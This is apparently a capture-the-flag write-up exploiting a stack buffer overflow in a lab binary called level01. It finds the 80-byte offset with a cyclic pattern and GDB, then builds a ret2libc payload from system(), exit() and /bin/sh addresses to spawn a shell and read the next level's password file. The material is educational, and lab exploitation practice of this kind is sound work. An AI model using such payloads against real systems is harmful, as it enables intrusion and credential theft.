When running the level01 program, we observe that it prompts for a username and a password. The code source clearly indicates the credentiels (dat_wil, admin)
But, it won't work no matter what we can do bc the code is not made to.

Example:
```bash
./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
Enter Password:
nope, incorrect password...
```

---

By testing very long passwords as input, the program crashes with a Segmentation Fault:
Enter Password:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault

This indicates a buffer overflow vulnerability, where data exceeds the buffer's expected size, overwriting the return address (EIP).

## 1. Finding the Offset

---

To pinpoint the exact position where the EIP is overwritten, the cyclic pattern generator tool on wiremask.eu was used.

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9

Provide this pattern as the password during program execution:
```py
python -c 'print "dat_wil\n" + "<generated_pattern>"' | ./level01
```
Analyze the Crash in GDB:
Run the program in GDB:

gdb ./level01

After the crash, inspect the EIP register:

info registers

output:
eip            0x37634136   0x37634136

Use the EIP value on wiremask.eu to determine its position in the pattern.
The tool provides the exact offset, in this case, 80 bytes.

Exploitation Steps

## 2. Prepare the Addresses

To exploit the vulnerability, the following addresses (in little-endian) are needed:

```bash
    system(): 0xf7e6aed0 → \xd0\xae\xe6\xf7
    exit(): 0xf7e5eb70 → \x70\xeb\xe5\xf7
    /bin/sh: 0xf7f897ec → \xec\x97\xf8\xf7
```
These addresses can be confirmed in GDB:

p system
p exit
find "/bin/sh"

## 3. Generate the Payload

The payload structure is as follows:

    Valid username: dat_wil\n
    Padding: 80 bytes of A ("A" * 80)
    Address of system(): \xd0\xae\xe6\xf7
    Address of exit(): \x70\xeb\xe5\xf7
    Address of /bin/sh: \xec\x97\xf8\xf7

Generate the payload:
```py
python -c 'print "dat_wil\n"+"A"*80+"\xd0\xae\xe6\xf7"+"\x70\xeb\xe5\xf7"+"\xec\x97\xf8\xf7"' > /tmp/payload
```
## 4. Inject the Payload

Execute the program with the payload:

cat /tmp/payload - | ./level01

## 5. Retrieve the Flag

If the exploit succeeds, an interactive shell opens. In this shell, retrieve the flag:

cat /home/users/level02/.pass
